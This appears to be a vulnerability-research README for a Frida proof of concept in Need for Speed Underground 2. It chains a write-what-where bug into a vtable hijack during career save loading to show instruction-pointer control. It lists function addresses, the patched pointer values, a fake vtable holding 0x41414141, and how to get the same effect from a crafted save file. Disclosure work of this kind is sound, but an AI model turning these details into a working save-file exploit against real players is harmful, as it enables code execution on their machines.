# Proof of Concept — EIP Control

Frida-based proof that the Vuln 2 → Vuln 3 chain achieves full instruction pointer control.

## What it does

The script instruments three functions during career save loading:

1. **FUN_005344e0** (deserializer entry) — arms the chain when deserialization begins
2. **FUN_004792b0** (Vuln 2) — redirects the write-what-where to overwrite a global vtable pointer
3. **FUN_00469050** (Vuln 3) — logs the vtable call state right before EIP is hijacked

An exception handler captures the resulting access violation and reports the controlled EIP value.

## What it does NOT do

- Does not execute shellcode or any payload beyond `0x41414141`
- Does not modify save files on disk
- Does not persist any changes — killing the game process undoes everything

## Requirements

- [Frida](https://frida.re/) (`pip install frida-tools`)
- Need for Speed Underground 2 installed
- A career save profile (any save works)

## Steps

### 1. Launch the game

Start `SPEED2.EXE` normally. Wait for the main menu to load.

### 2. Find the process ID

```
frida-ps | findstr SPEED2
```

Or on PowerShell:

```powershell
Get-Process SPEED2 | Select-Object Id
```

### 3. Attach Frida

```
frida -p <PID> -l eip_control.js
```

You should see:

```
[Local::PID::<PID>]-> EIP control PoC loaded. Load a career save to trigger.
```

### 4. Trigger the chain

In the game, go to the career menu and load a saved profile. The chain fires during deserialization.

### 5. Observe the result

Frida's console will show the full chain trace:

```
deser_inner entered — chain ARMED
--- Vuln 2 (0x4792b0) ENTERED ---
  ECX (this) = 0xbe41f80
  *(ECX+0x98) = 0xbe41f40 -> original target = 0xbe41f54
  PATCHED *(ECX+0x98) = 0x82b960 -> write targets DAT_0082b974
  original param_1 = 0x1
  PATCHED param_1 = 0x83ace0
  FAKE OBJ at 0x83ace0: *obj = obj (self-referencing vtable)
  PLANTED 0x41414141 at 0x83acf4 (vtable[5])
  After Vuln 2 return: DAT_0082b974 = 0x83ace0
  Vuln 2 mechanism overwrote DAT_0082b974 naturally
--- Vuln 3 (0x469050) ENTERED ---
  ECX = 0xbe41f80
  gate *(ECX+0xa0) = 0xbdd5980 OPEN
  DAT_0082b974 = 0x83ace0 <- FAKE VTABLE
  CALL target = 0x41414141 <- 0x41414141 ARMED
*** EIP = 0x41414141 — INSTRUCTION POINTER CONTROLLED ***
```

The game will crash with an access violation. This is expected — `0x41414141` is not a valid code address.

## Notes

- The script uses `Interceptor.attach`, so Frida must be attached to a running process (not spawned). Spawn mode crashes the game.
- ECX in Vuln 2 is a heap-allocated audio manager object, not the career struct. The address varies between runs but the exploit works regardless because we read the actual ECX at runtime.
- In a save-file-only exploit (no Frida), the same effect is achieved by setting the right bytes in the career payload so that `*(ECX+0x98)` already points to `0x0082b960` and the corresponding parameter is already `0x0083ace0`.
